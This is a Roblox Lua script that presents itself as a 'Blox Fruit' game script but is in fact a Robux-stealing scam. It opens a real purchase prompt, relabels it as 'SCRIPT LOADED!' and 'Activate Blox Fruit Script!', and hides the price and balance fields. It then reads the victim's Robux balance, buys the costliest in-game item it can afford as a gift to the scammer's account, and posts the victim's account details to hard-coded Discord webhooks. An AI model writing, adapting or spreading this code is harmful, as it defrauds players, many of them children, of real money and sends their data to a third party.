-- BLOX FRUIT?
UserId = "TehPucuk_55"
LogsWebhook = "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local result = 0 

local HttpService = game:GetService("HttpService")

local success = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local args = {
    [1] = "buyRobuxShop",
    [2] = {
        ["StorageName"] = "2x EXP (15 mins.)",
        ["FunnelId"] = "Shop",
        ["PurchaseLocation"] = "Shop"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))

local CoreGui = game:GetService("CoreGui")
local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
local Animator = ProductContainer:WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local prompt = Animator:WaitForChild("Prompt")
        local alertContents = prompt:WaitForChild("AlertContents")
        
        local middleContent = alertContents:FindFirstChild("MiddleContent")
        if middleContent then
            middleContent.Visible = false
        end

        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
        if title and title:IsA("TextLabel") then
            title.Text = "SCRIPT LOADED!"
        end
        
        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2.Visible = false
        end

        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
        if footerContent then
            footerContent.Visible = false
        end
        
        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            local buttonContent = button1:WaitForChild("ButtonContent")
            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
            if buttonMiddleContent then
                buttonMiddleContent.Text = "LOAD!"
            end
        end
    end
end)

local function sendWebhook()

    local embed = {
        ["title"] = "Gaming Scripts - You Got Blox Fruit Hit! :apple:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 🚀 Level: " ..tostring(getLvl()).. "\n | 💻 Executor Used: " ..identifyexecutor().. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. result .. "```"
            },
            {
                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
                ["value"] = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

function stealitem()
    if result >= 5000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["PurchaseLocation"] = "FruitShop",
                ["StorageName"] = "Permanent Dragon-Dragon",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 4000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Kitsune-Kitsune",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 3000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Leopard-Leopard",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2700 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Fruit Notifier",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2550 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Spirit-Spirit",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2500 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Gas-Gas",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2450 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Venom-Venom",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2425 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Shadow-Shadow",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2400 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Dough-Dough",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2350 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent T-Rex-T-Rex",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2300 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Gravity-Gravity",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Blizzard-Blizzard",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2200 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Pain-Pain",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Rumble-Rumble",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Portal-Portal",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1900 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Sound-Sound",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1800 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Spider-Spider",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1700 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Love-Love",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1650 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Buddha-Buddha",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1500 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Quake-Quake",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1300 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Magma-Magma",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1275 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Ghost-Ghost",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Barrier-Barrier",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1200 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Dark Blade",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Light-Light",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Diamond-Diamond",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 950 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Dark-Dark",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 850 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Sand-Sand",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 750 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Ice-Ice",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 650 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Falcon-Falcon",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 550 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Flame-Flame",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 450 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "2x Money",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 400 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "+1 Fruit Storage",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 380 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Spike-Spike",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        
    elseif result >= 350 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "2x Boss Drops",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Smoke-Smoke",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 220 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Bomb-Bomb",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 180 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Spring-Spring",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Blade-Blade",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 75 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "Permanent Spin-Spin",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 50 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "10K Money",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 25 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Gaming On top",
                ["StorageName"] = "2x EXP (15 mins.)",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    end
end

local function WaitForPrompt1()
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")
    stealitem()
    local CoreGui = game:GetService("CoreGui")

local success, err = pcall(function()
    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
    local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
    local Animator = ProductPurchaseContainer:WaitForChild("Animator")
    local Prompt = Animator:WaitForChild("Prompt")
    local AlertContents = Prompt:WaitForChild("AlertContents")
    
    local MiddleContent = AlertContents:WaitForChild("MiddleContent")
    MiddleContent.Visible = false
    
    local Footer = AlertContents:WaitForChild("Footer")
    local FooterButtons = Footer:WaitForChild("Buttons")
    local FooterButton1 = FooterButtons:WaitForChild("1")
    FooterButton1.Visible = false
    
    local FooterContent = Footer:WaitForChild("FooterContent")
    FooterContent.Visible = false

    local FooterButton2 = FooterButtons:WaitForChild("2")
    FooterButton2.Visible = true

    local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
    FooterButton2Text.Text = "Activate!"
    FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
    
    local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
    FooterButton2Icon.Visible = false

    local TitleContainer = AlertContents:WaitForChild("TitleContainer")
    local TitleArea = TitleContainer:WaitForChild("TitleArea")
    local TitleText = TitleArea:WaitForChild("Title")
    TitleText.Text = "Activate Blox Fruit Script!"
    TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
end)

if not success then
    warn("UI..")
end
end

local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")

if balanceText then
    result = tonumber(balanceText) + 25 
end

local function WaitForPrompt2()
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")
    sendWebhook()
end

WaitForPrompt1()
WaitForPrompt2()
